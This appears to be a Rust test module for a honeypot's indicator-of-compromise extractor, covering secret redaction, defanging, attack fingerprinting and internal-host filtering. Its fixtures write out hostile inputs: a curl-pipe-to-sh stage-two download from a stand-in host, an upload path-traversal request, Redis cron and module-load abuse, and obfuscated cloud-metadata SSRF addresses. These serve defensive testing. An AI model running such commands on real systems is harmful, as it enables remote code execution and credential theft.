                r#"{"user":"bob","password":"hunter2","n":1}"#,
                r#"{"user":"bob","password":"REDACTED","n":1}"#,
            ),
            (r#"{"Password" : "x y"}"#, r#"{"Password" : "REDACTED"}"#),
            (r#"{"apiToken": 12345}"#, r#"{"apiToken": REDACTED}"#),
            // Headers: the whole value.
            ("X-Api-Key: abc123", "X-Api-Key: REDACTED"),
            ("X-Api-Key: k1 k2", "X-Api-Key: REDACTED"),
            (
                "curl -H 'X-Api-Key: k1 k2' http://a.example.invalid/",
                "curl -H 'X-Api-Key: REDACTED' http://a.example.invalid/",
            ),
            ("cookie: sid=abc", "cookie: REDACTED"),
            ("Authorization: Bearer abc.def", "Authorization: REDACTED"),
            (
                "Authorization: Basic dXNlcjpwdw==",
                "Authorization: REDACTED",
            ),
            // URL userinfo keeps the user.
            (
                "curl http://u:p@203.0.113.9/x",
                "curl http://u:REDACTED@203.0.113.9/x",
            ),
            (
                "mysql://root:hunter2@db.example.invalid/x",
                "mysql://root:REDACTED@db.example.invalid/x",
            ),
            (
                "redis://:hunter2@203.0.113.9:6379",
                "redis://REDACTED@203.0.113.9:6379",
            ),
            (
                "https://ghp_abc@git.example.invalid/x",
                "https://REDACTED@git.example.invalid/x",
            ),
            // Command lines keep their shape.
            (
                "mysql --password hunter2 -h db",
                "mysql --password REDACTED -h db",
            ),
            ("app --password=hunter2", "app --password=REDACTED"),
            (
                "mysql -uroot -phunter2 -h 203.0.113.9",
                "mysql -uroot -pREDACTED -h 203.0.113.9",
            ),
            (
                "sudo mysqldump -phunter2 db",
                "sudo mysqldump -pREDACTED db",
            ),
            (
                "sshpass -p hunter2 ssh root@203.0.113.9",
                "sshpass -p REDACTED ssh root@203.0.113.9",
            ),
            ("sshpass -phunter2 ssh x", "sshpass -pREDACTED ssh x"),
            (
                "sh -c 'sshpass -p hunter2 ssh x'",
                "sh -c 'sshpass -p REDACTED ssh x'",
            ),
            (
                "curl -u admin:hunter2 http://a.example.invalid/",
                "curl -u admin:REDACTED http://a.example.invalid/",
            ),
            (
                "curl --user 'admin:hunter2' x",
                "curl --user 'admin:REDACTED' x",
            ),
            (
                "smbclient //h/s -U admin%hunter2",
                "smbclient //h/s -U admin%REDACTED",
            ),
            (
                "redis-cli -h 203.0.113.9 -a hunter2 info",
                "redis-cli -h 203.0.113.9 -a REDACTED info",
            ),
            (
                "mosquitto_pub -u x -P hunter2 -t t",
                "mosquitto_pub -u x -P REDACTED -t t",
            ),
            ("unzip -P hunter2 a.zip", "unzip -P REDACTED a.zip"),
            ("7z x -phunter2 a.7z", "7z x -pREDACTED a.7z"),
            (
                "openssl enc -d -pass pass:hunter2",
                "openssl enc -d -pass REDACTED",
            ),
            ("ls | mysql -phunter2", "ls | mysql -pREDACTED"),
            // Not secrets: -p means something else for these programs.
            ("mkdir -p /tmp/x", "mkdir -p /tmp/x"),
            (
                "ssh -p 2222 root@203.0.113.9",
                "ssh -p 2222 root@203.0.113.9",
            ),
            ("mysql -p db", "mysql -p db"),
            // Emails, plain and URL-encoded.
            (
                "mail admin@example.invalid now",
                "mail REDACTED@example.invalid now",
            ),
            (
                "/subscribe?to=admin%40example.invalid",
                "/subscribe?to=REDACTED%40example.invalid",
            ),
            // Over-redaction avoided.
            ("/blog?author=bob", "/blog?author=bob"),
            ("PasswordAuthentication=no", "PasswordAuthentication=no"),
            (
                "sed -i s/x/y/ PasswordAuthentication yes",
                "sed -i s/x/y/ PasswordAuthentication yes",
            ),
            ("curl auth-server:8080/x", "curl auth-server:8080/x"),
            ("ssh root@203.0.113.9", "ssh root@203.0.113.9"),
            (
                "http://stage2.example.invalid:8080/x",
                "http://stage2.example.invalid:8080/x",
            ),
            ("/plain/path", "/plain/path"),
        ];
        for (raw, want) in cases {
            let (got, changed) = redact(raw);
            assert_eq!(got, want, "{raw}");
            assert_eq!(changed, raw != want, "{raw}");
        }
    }

    #[test]
    fn redaction_is_linear_on_hostile_input() {
        let s = "=".repeat(100_000) + &"@".repeat(100_000) + &"://".repeat(30_000);
        let (out, _) = redact(&s);
        assert_eq!(out.len(), s.len());
    }

    #[test]
    fn defang_and_refang() {
        assert_eq!(defang(IocType::Ip, "203.0.113.7"), "203[.]0[.]113[.]7");
        assert_eq!(defang(IocType::Ipv6, "2001:db8::1"), "2001[:]db8[:][:]1");
        assert_eq!(
            defang(IocType::Url, "http://stage2.example.invalid/x.sh"),
            "hxxp://stage2[.]example[.]invalid/x.sh"
        );
        assert_eq!(
            defang(IocType::Cmdline, "curl HTTPS://a.example.invalid/x\u{202E}"),
            "curl hxxps://a[.]example[.]invalid/x\\u{202e}"
        );
        assert_eq!(
            refang("hxxp://stage2[.]example[.]invalid/x.sh"),
            "http://stage2.example.invalid/x.sh"
        );
        assert_eq!(refang(" 203[.]0[.]113[.]7 "), "203.0.113.7");
    }

    #[test]
    fn network_values_are_normalised_and_private_addresses_skipped() {
        let mut egress = ev(
            "e2",
            T0 + 10,
            "egress",
            "10.85.1.2",
            json!({"verdict": "blocked",
            "host": "Stage2.Example.INVALID", "method": "GET", "path": "/x.sh"}),
        );
        egress["dst"] = json!({"ip": "192.0.2.80", "port": 80});
        let mut internal = ev(
            "e3",
            T0 + 20,
            "egress",
            "10.85.1.2",
            json!({"method": "POST"}),
        );
        internal["dst"] = json!({"ip": "10.0.0.5", "port": 80});
        let events = parse(vec![
            hook("e1", T0, "203.0.113.7", "trigger", json!({})),
            egress,
            internal,
        ]);
        let (_, x) = run(&events, ExtractOptions::default());
        assert_eq!(values(&x, IocType::Ip), vec!["203.0.113.7", "192.0.2.80"]);
        assert_eq!(values(&x, IocType::Domain), vec!["stage2.example.invalid"]);
        assert_eq!(
            values(&x, IocType::Url),
            vec!["http://stage2.example.invalid/x.sh"]
        );
        let url = x.iocs.iter().find(|i| i.ioc_type == IocType::Url).unwrap();
        assert_eq!(url.roles, vec![IocRole::Stage2]);
        assert_eq!(url.display, "hxxp://stage2[.]example[.]invalid/x.sh");
    }

    #[test]
    fn canary_values_never_become_iocs() {
        let beacon = ev(
            "e1",
            T0,
            "egress",
            "203.0.113.45",
            json!({"detector": "beacon",
            "canary_id": "cn_5b0e9d2a71c4f836", "method": "GET",
            "path": "/c/cn_5b0e9d2a71c4f836/v1/users", "user_agent": "python-requests/2.32.3"}),
        );
        let events = parse(vec![
            ev(
                "e0",
                T0 - 10,
                "application",
                "203.0.113.45",
                json!({"method": "GET",
                "path": "/admin?key=vt-canary-ak-0000"}),
            ),
            beacon,
        ]);
        let (_, x) = run(&events, ExtractOptions::default());
        assert!(
            x.iocs
                .iter()
                .all(|i| !i.value.contains("canary") && !i.value.contains("cn_"))
        );
        assert_eq!(values(&x, IocType::Ip), vec!["203.0.113.45"]);
        assert_eq!(values(&x, IocType::HttpUa), vec!["python-requests/2.32.3"]);
    }

    #[test]
    fn bodies_are_hash_only_unless_payloads_are_stored() {
        let events = parse(vec![ev(
            "e1",
            T0,
            "application",
            "203.0.113.7",
            json!({"method": "POST", "path": "/u",
                "body": "a=1", "body_sha256": "9F86D081884C7D659A2FEAA0C55AD015A3BF4F1B2B0B822CD15D6C15B0F00A08"}),
        )]);
        let (_, x) = run(&events, ExtractOptions::default());
        assert!(values(&x, IocType::RequestSubstring).is_empty());
        assert_eq!(
            values(&x, IocType::PayloadSha256),
            vec!["9f86d081884c7d659a2feaa0c55ad015a3bf4f1b2b0b822cd15d6c15b0f00a08"]
        );
        let (_, x) = run(
            &events,
            ExtractOptions {
                store_payloads: true,
            },
        );
        assert_eq!(values(&x, IocType::RequestSubstring), vec!["a=1"]);
    }

    #[test]
    fn memory_only_attempt_is_flagged_and_has_no_file_hash() {
        let events = parse(vec![
            ev(
                "e1",
                T0,
                "application",
                "203.0.113.7",
                json!({"method": "POST",
                "path": "/api/upload?path=../../tmp/x.sh", "user_agent": "demo-loader/0.1"}),
            ),
            hook("e2", T0 + 10, "203.0.113.7", "trigger", json!({})),
            hook(
                "e3",
                T0 + 20,
                "203.0.113.7",
                "post_exploit",
                json!({
                "cmd_lines": ["sh -c 'curl -s http://stage2.example.invalid/m | sh'"]}),
            ),
        ]);
        let (attempts, x) = run(&events, ExtractOptions::default());
        let a = x.for_attempt(&attempts[0].attempt_id).unwrap();
        assert!(a.file_ioc_limited);
        assert!(a.notes[0].contains("memory-resident"));
        assert!(values(&x, IocType::FileSha256).is_empty());
        assert!(x.iocs.iter().all(|i| i.file_ioc_limited));
        assert_eq!(values(&x, IocType::BehaviourFingerprint).len(), 1);
        assert_eq!(values(&x, IocType::Cmdline).len(), 1);
        assert_eq!(
            values(&x, IocType::Url),
            vec!["http://stage2.example.invalid/m"]
        );
    }

    #[test]
    fn implant_hash_lifts_the_file_limit() {
        let sha = "c1c5d1b2f75673adc7db8fbf8bf1ab10f405dac8e71ce3cb8d7d0fef7fdeb172";
        let events = parse(vec![
            hook("e1", T0, "203.0.113.7", "trigger", json!({})),
            hook(
                "e2",
                T0 + 10,
                "203.0.113.7",
                "post_exploit",
                json!({
                "implant_refs": [format!("r2://foiled-evidence/t1/d1/_/quarantine/{sha}")]}),
            ),
        ]);
        let (attempts, x) = run(&events, ExtractOptions::default());
        assert!(
            !x.for_attempt(&attempts[0].attempt_id)
                .unwrap()
                .file_ioc_limited
        );
        assert_eq!(values(&x, IocType::FileSha256), vec![sha]);
    }

    #[test]
    fn fingerprint_ignores_volatile_values_and_input_order() {
        let chain = |src: &str, host: &str, id: &str| {
            let mut egress = ev(
                &format!("{id}3"),
                T0 + 30,
                "egress",
                "10.85.1.2",
                json!({"host": host, "method": "GET", "path": "/s"}),
            );
            egress["dst"] = json!({"ip": "192.0.2.80", "port": 80});
            parse(vec![
                ev(
                    &format!("{id}1"),
                    T0,
                    "application",
                    src,
                    json!({"method": "POST",
                    "path": "/api/upload?path=../../tmp/12345.sh"}),
                ),
                hook(&format!("{id}2"), T0 + 10, src, "trigger", json!({})),
                egress,
            ])
        };
        let (_, a) = run(
            &chain("203.0.113.7", "a.example.invalid", "a"),
            ExtractOptions::default(),
        );
        let mut other = chain("198.51.100.9", "b.example.invalid", "b");
        other.reverse();
        let (_, b) = run(&other, ExtractOptions::default());
        let fa = values(&a, IocType::BehaviourFingerprint);
        assert_eq!(fa, values(&b, IocType::BehaviourFingerprint));
        assert!(fa[0].starts_with("bf1:") && fa[0].len() == 36);
        let detail = a.iocs.iter().find_map(|i| i.fingerprint.clone()).unwrap();
        assert_eq!(
            detail.steps,
            vec![
                "http POST /api/upload?path",
                "hook demo-app.upload-path-traversal trigger",
                "egress GET"
            ]
        );
    }

    #[test]
    fn probe_only_attempts_have_no_fingerprint_and_low_confidence() {
        let events = parse(vec![
            ev(
                "e1",
                T0,
                "application",
                "198.51.100.23",
                json!({"method": "GET", "path": "/"}),
            ),
            ev(
                "e2",
                T0 + 1,
                "application",
                "198.51.100.23",
                json!({"method": "GET", "path": "/admin"}),
            ),
        ]);
        let (_, x) = run(&events, ExtractOptions::default());
        assert!(values(&x, IocType::BehaviourFingerprint).is_empty());
        assert!(
            values(&x, IocType::HttpPath) == vec!["/admin"],
            "'/' is not an IOC"
        );
        let ip = &x.iocs[0];
        assert_eq!(ip.confidence.band, Band::Low);
        assert!(!ip.confidence.publishable);
        assert_eq!(ip.confidence.wording, "we assess as");
    }

    #[test]
    fn dedup_across_attempts_tracks_first_and_last_seen() {
        let events = parse(vec![
            ev(
                "e1",
                T0,
                "application",
                "203.0.113.7",
                json!({"method": "GET", "path": "/admin", "user_agent": "x/1"}),
            ),
            ev(
                "e2",
                T0 + DEFAULT_IDLE_GAP_MS + 5,
                "application",
                "203.0.113.7",
                json!({"method": "GET", "path": "/admin", "user_agent": "x/1"}),
            ),
        ]);
        let (attempts, x) = run(&events, ExtractOptions::default());
        assert_eq!(attempts.len(), 2);
        let ua = x
            .iocs
            .iter()
            .find(|i| i.ioc_type == IocType::HttpUa)
            .unwrap();
        assert_eq!(ua.attempt_ids.len(), 2);
        assert_eq!(ua.sightings, 2);
        assert_eq!(
            (ua.first_seen, ua.last_seen),
            (T0, T0 + DEFAULT_IDLE_GAP_MS + 5)
        );
        assert_eq!(ua.ioc_id, ioc_id(IocType::HttpUa, "x/1"));
        let mut attempts = attempts;
        attach_refs(&mut attempts, &x);
        assert!(attempts.iter().all(|a| a.ioc_refs.contains(&ua.ioc_id)));
    }

    #[test]
    fn hook_evidence_raises_confidence() {
        let events = parse(vec![hook("e1", T0, "203.0.113.7", "trigger", json!({}))]);
        let (_, x) = run(&events, ExtractOptions::default());
        let ip = &x.iocs[0];
        // Hook 60 plus decoy prior 10, less 2 for a noise score of 10.
        assert_eq!(ip.confidence.score, 68);
        assert!(ip.confidence.publishable);
    }

    #[test]
    fn protocol_credentials_are_redacted() {
        let events = parse(vec![ev(
            "e1",
            T0,
            "application",
            "203.0.113.7",
            json!({"command": "AUTH", "args": ["hunter2"]}),
        )]);
        let (_, x) = run(&events, ExtractOptions::default());
        assert_eq!(values(&x, IocType::RequestSubstring), vec!["AUTH REDACTED"]);
        assert!(x.iocs.iter().any(|i| i.redacted));
    }

    #[test]
    fn enrichment_refs_are_marked_and_dropped_for_export() {
        let events = parse(vec![ev("e1", T0, "application", "203.0.113.7", json!({}))]);
        let (_, mut x) = run(&events, ExtractOptions::default());
        let o = Observable::ip("203.0.113.7").unwrap();
        let fact = |provider: &str, key: &str, v: Value, at: i64| Fact {
            provider: provider.into(),
            key: key.into(),
            value: v,
            confidence: 90,
            observed_at: at,
            ttl_secs: 60,
            raw_ref: None,
        };
        let facts = BTreeMap::from([(
            o,
            vec![
                fact("local_asn", "asn.number", json!(64498), 1),
                fact("local_asn", "asn.number", json!(64499), 2),
                fact("greynoise", "greynoise.noise", json!(true), 2),
                fact("team_asn", "asn.org", json!("Example\u{202E}Hosting"), 2),
            ],
        )]);
        assert_eq!(address_observables(&x.iocs).len(), 1);
        apply_enrichment(&mut x.iocs, &facts);
        let e = &x.iocs[0].enrichment;
        assert_eq!(e.len(), 2);
        assert_eq!(e[0].value, json!(64499), "newest fact wins");
        assert!(!e[0].shareable);
        assert_eq!(e[1].value, json!("Example\\u{202e}Hosting"));
        let out = redact_for_export(&x.iocs);
        assert_eq!(out[0].enrichment.len(), 1);
        assert_eq!(out[0].enrichment[0].provider, "team_asn");
    }

    #[test]
    fn protocol_secrets_and_canaries_stay_out_of_fingerprints() {
        let attempt = |pw: &str, id: &str| {
            parse(vec![
                ev(
                    &format!("{id}1"),
                    T0,
                    "application",
                    "203.0.113.7",
                    json!({"command": "AUTH", "args": [pw]}),
                ),
                ev(
                    &format!("{id}2"),
                    T0 + 1,
                    "application",
                    "203.0.113.7",
                    json!({"command": "CONFIG", "args": ["SET", "dir", "/var/spool/cron"]}),
                ),
                ev(
                    &format!("{id}3"),
                    T0 + 2,
                    "application",
                    "203.0.113.7",
                    json!({"command": "SET", "args": ["vt-canary-ak-0000", "x"]}),
                ),
                hook(
                    &format!("{id}4"),
                    T0 + 3,
                    "203.0.113.7",
                    "trigger",
                    json!({}),
                ),
            ])
        };
        let (_, a) = run(
            &attempt("vt-canary-ak-5b0e9d2a71c4f836", "a"),
            ExtractOptions::default(),
        );
        let (_, b) = run(&attempt("hunter2", "b"), ExtractOptions::default());
        let (_, c) = run(&attempt("correct horse", "c"), ExtractOptions::default());
        let fa = values(&a, IocType::BehaviourFingerprint);
        assert_eq!(fa.len(), 1);
        assert_eq!(
            fa,
            values(&b, IocType::BehaviourFingerprint),
            "passwords do not change bf1"
        );
        assert_eq!(fa, values(&c, IocType::BehaviourFingerprint));
        let steps = a
            .iocs
            .iter()
            .find_map(|i| i.fingerprint.clone())
            .unwrap()
            .steps;
        assert_eq!(
            steps,
            vec![
                "cmd AUTH",
                "cmd CONFIG SET",
                "cmd SET",
                "hook demo-app.upload-path-traversal trigger"
            ]
        );
        for x in [&a, &b, &c] {
            for i in &x.iocs {
                let all = format!("{} {} {:?}", i.value, i.display, i.fingerprint);
                assert!(
                    !all.contains("canary") && !all.contains("hunter2") && !all.contains("horse"),
                    "{all}"
                );
            }
        }
    }

    #[test]
    fn fingerprint_folds_odd_path_segments_and_methods() {
        let events = parse(vec![
            ev(
                "e1",
                T0,
                "application",
                "203.0.113.7",
                json!({"method": "G\u{202E}ET",
                "path": "/reset/0123456789abcdef0123456789abcdef0123/vt-canary-ak-1/x?token=1"}),
            ),
            hook("e2", T0 + 1, "203.0.113.7", "trigger", json!({})),
        ]);
        let (_, x) = run(&events, ExtractOptions::default());
        let steps = x
            .iocs
            .iter()
            .find_map(|i| i.fingerprint.clone())
            .unwrap()
            .steps;
        assert_eq!(steps[0], "http * /reset/*/*/*?token");
    }

    #[test]
    fn internal_hosts_are_never_iocs() {
        let mut egress = ev(
            "e2",
            T0 + 10,
            "egress",
            "10.85.1.2",
            json!({"host": "metadata.google.internal", "method": "GET", "path": "/computeMetadata/v1/"}),
        );
        egress["dst"] = json!({"ip": "169.254.169.254", "port": 80});
        let events = parse(vec![
            hook(
                "e1",
                T0,
                "203.0.113.7",
                "trigger",
                json!({"cmd_lines": [
                    "curl http://169.254.169.254/latest/meta-data/",
                    "curl http://[fd00::1]/x http://2852039166/y http://0xa9fea9fe/z",
                    "wget http://printer.local/a http://intranet/b http://localhost:8080/c",
                    "curl http://stage2.example.invalid/ok"
                ]}),
            ),
            egress,
            ev(
                "e3",
                T0 + 20,
                "dns",
                "10.85.1.2",
                json!({"query": "metadata.google.internal"}),
            ),
            ev(
                "e4",
                T0 + 21,
                "dns",
                "10.85.1.2",
                json!({"query": "7.2.0.192.in-addr.arpa"}),
            ),
        ]);
        let (_, x) = run(&events, ExtractOptions::default());
        assert_eq!(
            values(&x, IocType::Url),
            vec!["http://stage2.example.invalid/ok"]
        );
        assert_eq!(values(&x, IocType::Domain), vec!["stage2.example.invalid"]);
        assert!(values(&x, IocType::DnsQuery).is_empty());
        assert_eq!(values(&x, IocType::Ip), vec!["203.0.113.7"]);
        assert!(values(&x, IocType::Ipv6).is_empty());
    }

    #[test]
    fn a_capped_file_hash_still_counts_as_a_file() {
        let sha = "c1c5d1b2f75673adc7db8fbf8bf1ab10f405dac8e71ce3cb8d7d0fef7fdeb172";
        let lines: Vec<String> = (0..MAX_IOCS_PER_ATTEMPT)
            .map(|i| format!("echo {i}"))
            .collect();
        let events = parse(vec![
            hook("e1", T0, "203.0.113.7", "trigger", json!({})),
            hook(
                "e2",
                T0 + 1,
                "203.0.113.7",
                "post_exploit",
                json!({"cmd_lines": lines}),
            ),
            ev(
                "e3",
                T0 + 2,
                "quarantine",
                "203.0.113.7",
                json!({"sha256": sha}),
            ),
        ]);
        let (attempts, x) = run(&events, ExtractOptions::default());
        let a = x.for_attempt(&attempts[0].attempt_id).unwrap();
        assert_eq!(a.ioc_refs.len(), MAX_IOCS_PER_ATTEMPT);
        assert!(
            values(&x, IocType::FileSha256).is_empty(),
            "dropped by the cap"
        );
        assert!(!a.file_ioc_limited, "but the file was captured");
        assert!(a.notes.iter().any(|n| n.contains("not kept")));
    }

    #[test]
    fn protocol_secret_arguments_are_redacted_by_position() {
        let cases: [(&str, Option<&str>, Value, &str); 9] = [
            (
                "AUTH",
                None,
                json!(["default", "hunter2"]),
                "AUTH default REDACTED",
            ),
            (
                "HELLO",
                None,
                json!(["3", "AUTH", "default", "hunter2"]),
                "HELLO 3 AUTH default REDACTED",
            ),
            (
                "HELLO",
                None,
                json!(["3", "SETNAME", "x"]),
                "HELLO 3 SETNAME x",
            ),
            (
                "CONFIG",
                Some("SET"),
                json!(["requirepass", "hunter2"]),
                "CONFIG SET requirepass REDACTED",
            ),
            (
                "CONFIG",
                Some("SET"),
                json!(["masterauth", "hunter2", "dir", "/tmp"]),
                "CONFIG SET masterauth REDACTED dir /tmp",
            ),
            (
                "CONFIG",
                None,
                json!(["SET", "requirepass", "hunter2"]),
                "CONFIG SET requirepass REDACTED",
            ),
            (
                "MIGRATE",
                None,
                json!([
                    "192.0.2.10",
                    "6379",
                    "k",
                    "0",
                    "5000",
                    "AUTH2",
                    "u",
                    "hunter2"
                ]),
                "MIGRATE 192.0.2.10 6379 k 0 5000 AUTH2 u REDACTED",
            ),
            (
                "ACL",
                Some("SETUSER"),
                json!(["bob", "on", ">hunter2", "#abcd"]),
                "ACL SETUSER bob on >REDACTED #REDACTED",
            ),
            ("PASS", None, json!(["hunter2"]), "PASS REDACTED"),
        ];
        for (i, (cmd, sub, args, want)) in cases.into_iter().enumerate() {
            let mut data = json!({"protocol": "redis", "command": cmd, "args": args});
            if let Some(sub) = sub {
                data["subcommand"] = json!(sub);
            }
            let events = parse(vec![ev(
                &format!("e{i}"),
                T0,
                "application",
                "203.0.113.7",
                data,
            )]);
            let (_, x) = run(&events, ExtractOptions::default());
            let got = x
                .iocs
                .iter()
                .find(|i| i.ioc_type == IocType::RequestSubstring)
                .unwrap();
            assert_eq!(got.value, want);
            assert_eq!(got.redacted, want.contains(REDACTED), "{want}");
        }
    }

    #[test]
    fn emulator_subcommands_shape_fingerprint_steps() {
        // The Redis emulator logs the subcommand apart and drops it from args.
        let events = parse(vec![
            ev(
                "e1",
                T0,
                "application",
                "203.0.113.7",
                json!({"protocol": "redis", "command": "CONFIG", "subcommand": "SET", "args": ["requirepass", "hunter2"]}),
            ),
            ev(
                "e2",
                T0 + 1,
                "application",
                "203.0.113.7",
                json!({"protocol": "redis", "command": "MODULE", "subcommand": "LOAD", "args": ["/tmp/exp.so"]}),
            ),
            hook("e3", T0 + 2, "203.0.113.7", "trigger", json!({})),
        ]);
        let (_, x) = run(&events, ExtractOptions::default());
        let steps = x
            .iocs
            .iter()
            .find_map(|i| i.fingerprint.clone())
            .unwrap()
            .steps;
        assert_eq!(steps[..2], ["cmd CONFIG SET", "cmd MODULE LOAD"]);
    }

    #[test]
    fn varying_path_segments_do_not_change_fingerprints() {
        let chain = |path: &str, id: &str| {
            parse(vec![
                ev(
                    &format!("{id}1"),
                    T0,
                    "application",
                    "203.0.113.7",
                    json!({"method": "POST", "path": path}),
                ),
                hook(
                    &format!("{id}2"),
                    T0 + 1,
                    "203.0.113.7",
                    "trigger",
                    json!({}),
                ),
            ])
        };
        let fp = |path: &str, id: &str| {
            let (_, x) = run(&chain(path, id), ExtractOptions::default());
            let f = x.iocs.iter().find_map(|i| i.fingerprint.clone()).unwrap();
            (
                values(&x, IocType::BehaviourFingerprint)[0].to_string(),
                f.steps[0].clone(),
            )
        };
        let (a, sa) = fp("/login/hunter0", "a");
        let (b, _) = fp("/login/correcthorse", "b");
        let (c, _) = fp("/login/x", "c");
        assert_eq!(sa, "http POST /login/*");
        assert_eq!(a, b);
        assert_eq!(a, c);
        assert_eq!(fp("/u/alice/files", "d").1, "http POST /u/*/*");
        assert_eq!(fp("/img/42.png", "e").1, "http POST /img/*");
        assert_eq!(fp("/api/v2/upload", "f").1, "http POST /api/v2/upload");
        assert_eq!(fp("/dl/aGVsbG93b3JsZEZvbw", "g").1, "http POST /dl/*");
        assert_eq!(
            fp("/cgi-bin/administrator.cgi", "h").1,
            "http POST /cgi-bin/administrator.cgi"
        );
    }

    #[test]
    fn loose_ipv4_and_trailing_dots_are_parsed_like_urls() {
        for (raw, want) in [
            ("0251.0376.0251.0376", "169.254.169.254"),
            ("0177.0.0.1", "127.0.0.1"),
            ("0xa9.0xfe.0xa9.0xfe", "169.254.169.254"),
            ("127.1", "127.0.0.1"),
            ("169.254.43518", "169.254.169.254"),
            ("2852039166", "169.254.169.254"),
            ("0xa9fea9fe", "169.254.169.254"),
            ("169.254.169.254.", "169.254.169.254"),
            ("[fd00::1]", "fd00::1"),
            ("203.0.113.7", "203.0.113.7"),
        ] {
            assert_eq!(
                parse_ip(raw).map(|i| i.to_string()).as_deref(),
                Some(want),
                "{raw}"
            );
        }
        for raw in [
            "256.1.1.1",
            "1.2.3.4.5",
            "08.1.1.1",
            "example.invalid",
            "1.example",
            "0x1g.1.1.1",
            "4294967296",
        ] {
            assert!(parse_ip(raw).is_none(), "{raw}");
        }
        assert!(internal_name("metadata.google.internal."));
        assert!(internal_name("LOCALHOST."));
        assert!(!internal_name("stage2.example.invalid."));
    }

    #[test]
    fn obfuscated_internal_hosts_are_never_iocs() {
        let mut egress = ev(
            "e2",
            T0 + 10,
            "egress",
            "10.85.1.2",
            json!({"host": "metadata.google.internal.", "method": "GET", "path": "/x"}),
        );
        egress["dst"] = json!({"ip": "203.0.113.99", "port": 80});
        let events = parse(vec![
            hook(
                "e1",
                T0,
                "203.0.113.7",
                "trigger",
                json!({"cmd_lines": [
                    "curl http://0251.0376.0251.0376/a http://0177.0.0.1/b http://0xa9.0xfe.0xa9.0xfe/c",
                    "curl http://127.1/d http://169.254.43518/e http://169.254.169.254./f",
                    "curl http://metadata.google.internal./g http://localhost./h",
                    "curl http://stage2.example.invalid./ok"
                ]}),
            ),
            egress,
            ev(
                "e3",
                T0 + 20,
                "dns",
                "10.85.1.2",
                json!({"query": "localhost."}),
            ),
            ev(
                "e4",
                T0 + 21,
                "dns",
                "10.85.1.2",
                json!({"query": "169.254.169.254."}),
            ),
        ]);
        let (_, x) = run(&events, ExtractOptions::default());
        assert_eq!(
            values(&x, IocType::Url),
            vec!["http://stage2.example.invalid./ok"]
        );
        assert_eq!(values(&x, IocType::Domain), vec!["stage2.example.invalid"]);
        assert!(values(&x, IocType::DnsQuery).is_empty());
        let mut ips = values(&x, IocType::Ip);
        ips.sort();
        assert_eq!(ips, vec!["203.0.113.7", "203.0.113.99"]);
    }

    #[test]
    fn types_round_trip() {
        for t in IocType::ALL {
            assert_eq!(IocType::parse(t.as_str()), Some(t));
            assert_eq!(serde_json::to_value(t).unwrap(), json!(t.as_str()));
        }
        assert_eq!(IocType::parse("md5"), None);
    }
}
